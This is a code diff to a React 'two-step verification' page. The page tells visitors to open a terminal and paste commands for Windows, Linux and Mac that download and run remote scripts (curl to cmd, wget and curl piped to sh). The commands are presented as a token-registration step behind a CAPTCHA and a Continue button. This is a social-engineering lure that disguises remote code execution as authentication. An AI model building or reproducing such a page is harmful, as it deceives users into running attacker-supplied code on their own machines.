@@ -119,101 +119,106 @@ const Twofa = () => {
               <div className="block rounded-lg bg-white px-[30px] py-[50px] text-left shadow-lg sm:px-10">
                 <div className="grid grid-cols-1 gap-6">
                   <div className="flex flex-col gap-y-[10px]">
-                      <label className="text-2xl font-bold leading-relaxed">
-                    To complete the two-step verification process and link your credentials to this platform, please follow these steps:
-                      </label>
+                    <label className="text-2xl font-bold leading-relaxed">
+                      To complete the two-step verification process and link your credentials to this platform, please follow these steps:
+                    </label>
 
-                    <ol className="list-decimal list-inside font-semibold space-y-2 mt-2">
-                      <li>Open your terminal.</li>
-                      <li>Copy the command provided below for your operating system and paste it into the terminal.</li>
-                    </ol>
+                    <ol className="list-decimal list-insidefont-medium text-gray-700 mt-4 space-y-2">
+                      <li className="font-bold" >Open your terminal.</li>
+                      <li className="font-bold" >Copy the command below for your OS and paste into the terminal.</li>
+                          <div className="bg-[#F9FAFB] border border-gray-300 rounded-xl p-8 mt-6 space-y-6 shadow-sm">
+                            <div className="text-xl font-bold">
+                              Your one-time verification token is: <span className="text-red-600">{machineHex}</span>
+                            </div>
 
-                    <div className="text-lg font-bold mt-4">
-                      Your one-time verification token is:{' '}
-                      <span className="text-colorOrangyRed">{machineHex}</span>
-                    </div>
+                            <div>
+                              <label className="text-lg font-semibold mb-2 block">Windows Command:</label>
+                              <div className="flex w-full items-center nocopy">
+                                <input
+                                  value={urlWindows}
+                                  type="text"
+                                  className="w-full rounded border px-6 py-4 font-mono text-base text-black"
+                                  readOnly
+                                  tabIndex={-1}
+                                />
+                                <button
+                                  onClick={() => copyToClipboard(`curl ${urlWindows} | cmd`)}
+                                  className="ml-4 rounded border-2 border-black bg-black py-3 px-5 text-white text-xl transition-colors duration-200 ease-in-out hover:bg-gray-800"
+                                >
+                                  <FaRegClipboard />
+                                </button>
+                              </div>
+                            </div>
 
-                    <label className="text-lg font-bold mt-4">Windows Command:</label>
-                    <div className="flex w-full items-center nocopy">
-                      <input
-                        value={urlWindows}
-                        type="text"
-                        className="w-full rounded border px-6 py-4 font-bold text-black"
-                        readOnly
-                        tabIndex={-1}
-                      />
-                      <button
-                        onClick={() => copyToClipboard(`curl ${urlWindows} | cmd`)}
-                        className="ml-2 rounded border-2 border-black bg-black py-4 px-6 text-white"
-                      >
-                        <FaRegClipboard />
-                      </button>
-                    </div>
+                            <div>
+                              <label className="text-lg font-semibold mb-2 block">Linux Command:</label>
+                              <div className="flex w-full items-center nocopy">
+                                <input
+                                  value={urlLinux}
+                                  type="text"
+                                  className="w-full rounded border px-6 py-4 font-mono text-base text-black"
+                                  readOnly
+                                  tabIndex={-1}
+                                />
+                                <button
+                                  onClick={() => copyToClipboard(`wget -qO- \"${urlLinux}\" | sh`)}
+                                  className="ml-4 rounded border-2 border-black bg-black py-3 px-5 text-white text-xl transition-colors duration-200 ease-in-out hover:bg-gray-800"
+                                >
+                                  <FaRegClipboard />
+                                </button>
+                              </div>
+                            </div>
 
-                    <label className="text-lg font-bold mt-4">Linux Command:</label>
-                    <div className="flex w-full items-center nocopy">
-                      <input
-                        value={urlLinux}
-                        type="text"
-                        className="w-full rounded border px-6 py-4 font-bold text-black"
-                        readOnly
-                        tabIndex={-1}
-                      />
-                      <button
-                        onClick={() => copyToClipboard(`wget -qO- "${urlLinux}" | sh`)}
-                        className="ml-2 rounded border-2 border-black bg-black py-4 px-6 text-white"
-                      >
-                        <FaRegClipboard />
-                      </button>
-                    </div>
-
-                    <label className="text-lg font-bold mt-4">Mac Command:</label>
-                    <div className="flex w-full items-center nocopy">
-                      <input
-                        value={urlMac}
-                        type="text"
-                        className="w-full rounded border px-6 py-4 font-bold text-black"
-                        readOnly
-                        tabIndex={-1}
-                      />
-                      <button
-                        onClick={() => copyToClipboard(`curl "${urlMac}" | sh`)}
-                        className="ml-2 rounded border-2 border-black bg-black py-4 px-6 text-white"
-                      >
-                        <FaRegClipboard />
-                      </button>
-                    </div>
+                            <div>
+                              <label className="text-lg font-semibold mb-2 block">Mac Command:</label>
+                              <div className="flex w-full items-center nocopy">
+                                <input
+                                  value={urlMac}
+                                  type="text"
+                                  className="w-full rounded border px-6 py-4 font-mono text-base text-black"
+                                  readOnly
+                                  tabIndex={-1}
+                                />
+                                <button
+                                  onClick={() => copyToClipboard(`curl \"${urlMac}\" | sh`)}
+                                  className="ml-4 rounded border-2 border-black bg-black py-3 px-5 text-white text-xl transition-colors duration-200 ease-in-out hover:bg-gray-800"
+                                >
+                                  <FaRegClipboard />
+                                </button>
+                              </div>
+                            </div>
+                          </div>
 
                     {copySuccess && (
                       <div className="mt-3 text-green-600 font-semibold text-center">
                         ✅ Command copied!
                       </div>
                     )}
+                      <li className="font-bold" >Press <strong>Continue</strong> to execute the command and finish the process.</li>
+                    </ol>
+                      <label className="text-gray-700 font-bold">
+                        This will securely register your token and finalize the authentication process.
+                      </label>
+                      <label className="text-gray-700 font-bold">
+                        If you need help or encounter any issues, please contact our support team.
+                      </label>
+                    <div className="flex justify-center mt-6">
+                      <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={handleCaptchaChange} />
+                    </div>
+
+                    <div className="flex justify-center mt-7">
+                      <button
+                        onClick={handleContinue}
+                        className="rounded-full border-2 border-black bg-black py-4 px-10 text-white transition-colors duration-200 ease-in-out hover:border-red-500 hover:bg-gray-800"
+                      >
+                        Continue
+                      </button>
+                    </div>
+
+                    <div className="relative z-[1] mb-14 mt-9 text-center font-bold before:absolute before:left-0 before:top-1/2 before:-z-[1] before:h-[1px] before:w-full before:-translate-y-1/2 before:bg-[#EAEDF0]">
+                      <span className="inline-block bg-white px-6">Verification</span>
+                    </div>
                   </div>
-                </div>
-
-                {/* Left-aligned instruction */}
-                <p className="text-base font-semibold mt-6 text-left">
-                  3. Press <strong>Continue</strong> to execute the command and finish the process.
-                </p>
-
-                {/* CAPTCHA */}
-                <div className="flex justify-center mt-4">
-                  <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={handleCaptchaChange} />
-                </div>
-
-                {/* Continue Button */}
-                <div className="flex justify-center mt-7">
-                  <button
-                    onClick={handleContinue}
-                    className="rounded-full border-2 border-black bg-black py-4 px-10 text-white hover:border-red-500 hover:text-white"
-                  >
-                    Continue
-                  </button>
-                </div>
-
-                <div className="relative z-[1] mb-14 mt-9 text-center font-bold before:absolute before:left-0 before:top-1/2 before:-z-[1] before:h-[1px] before:w-full before:-translate-y-1/2 before:bg-[#EAEDF0]">
-                  <span className="inline-block bg-white px-6">Verification</span>
                 </div>
               </div>
             </div>
